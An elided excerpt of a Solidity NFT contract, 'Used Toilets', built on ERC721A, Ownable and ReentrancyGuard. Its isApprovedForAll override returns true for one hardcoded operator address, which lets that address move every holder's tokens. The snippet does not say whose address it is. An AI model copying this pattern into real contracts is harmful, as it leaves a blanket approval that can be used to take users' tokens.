  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xc9042EE680b8465Bb94033Cb93B306517d97d34B){return true;}
...
contract UsedToilets is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Used Toilets", "UT", maxBatchSize_, collectionSize_) {
